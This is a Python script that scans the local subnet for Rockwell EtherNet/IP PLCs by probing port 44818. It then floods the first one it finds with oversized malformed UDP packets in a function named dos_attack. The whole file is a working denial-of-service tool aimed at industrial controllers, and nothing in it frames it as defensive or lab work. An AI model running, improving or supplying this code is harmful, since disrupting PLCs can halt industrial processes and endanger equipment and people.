import socket
import time
import struct
import threading
import ipaddress
import subprocess

# Configuration
TARGET_PORT = 44818  # Default EtherNet/IP port (explicit messaging)

# Function to discover the PLC's IP address using arp ping
def discover_plc_ip():
    try:
        # Get the network gateway IP using the `route` command
        route_output = subprocess.check_output(['route'], universal_newlines=True)
        
        # Parse the route output to find the gateway IP address
        for line in route_output.splitlines():
            parts = line.split()
            if len(parts) > 1 and parts[0] == 'default':
                gateway_ip = parts[1]
                break
        else:
            print("Error: Could not find default gateway.")
            return None

        # Determine the network address and subnet mask from the gateway IP
        try:
            # Construct an IPNetwork object for the gateway's network
            network = ipaddress.ip_network(f"{gateway_ip}/24", strict=False)
        except ValueError as e:
            print(f"Error: Invalid IP address format: {e}")
            return None

        # Arp ping all addresses on the network
        for ip in network.hosts():
            try:
                # Execute arp-ping command to send ARP requests
                arp_ping_output = subprocess.check_output(['arp-ping', '-c', '1', str(ip)], timeout=2, universal_newlines=True)
                
                # Check the output for 'reply' to identify alive hosts
                if 'reply' in arp_ping_output.lower():
                    print(f"Host {ip} is alive.")
                    # Check if it's a rockwell device
                    if is_rockwell_device(str(ip)):
                        print(f"Found potential Rockwell PLC at {ip}")
                        return str(ip)
                    else:
                        print(f"{ip} is alive but does not appear to be a Rockwell device")

            except subprocess.TimeoutExpired:
                print(f"Arp-ping to {ip} timed out.")
            except subprocess.CalledProcessError as e:
                print(f"Error during arp-ping to {ip}: {e}")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                return None

        print("No Rockwell PLC found on the network.")
        return None

    except Exception as e:
        print(f"Error during network discovery: {e}")
        return None


# Function to check if an IP address is likely a Rockwell device
def is_rockwell_device(ip_address):
    try:
        # Attempt to connect to the IP address on port 44818 (default EtherNet/IP)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Short timeout for responsiveness
        sock.connect((ip_address, TARGET_PORT))

        # If the connection succeeds, it's likely a Rockwell device
        sock.close()
        return True
    except socket.error:
        return False

# Function to send a malformed EtherNet/IP packet
def send_malformed_packet(target_ip, packet_size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Use UDP for this example
        sock.settimeout(1) # Short timeout.

        # Create a malformed packet (oversized in this case)
        # This is a very basic malformed packet.  A proper exploit would craft a packet
        # designed to trigger a specific vulnerability.
        malformed_packet = b"A" * packet_size

        sock.sendto(malformed_packet, (target_ip, TARGET_PORT))
        print(f"Sent malformed packet to {target_ip}:{TARGET_PORT} (Size: {packet_size})")
        sock.close()

    except socket.error as e:
        print(f"Error sending malformed packet: {e}")


# Function to flood the target with requests
def dos_attack(target_ip, num_packets, packet_size):
    print(f"Starting DoS attack on {target_ip}...")
    for i in range(num_packets):
        send_malformed_packet(target_ip, packet_size)
        # Introduce a small delay to avoid overwhelming the network and the attacking machine
        time.sleep(0.001)
    print(f"DoS attack finished.")


def main():
    plc_ip = discover_plc_ip()

    if not plc_ip:
        print("Could not discover PLC IP address.  Exiting.")
        return

    print(f"Discovered PLC IP Address: {plc_ip}")

    # Attack parameters (adjust these based on your environment and testing)
    num_packets = 1000  # Number of malformed packets to send
    packet_size = 65000 # Size of each malformed packet (max UDP size).  You may need to lower this.

    # Start the DoS attack
    dos_attack(plc_ip, num_packets, packet_size)


if __name__ == "__main__":
    main()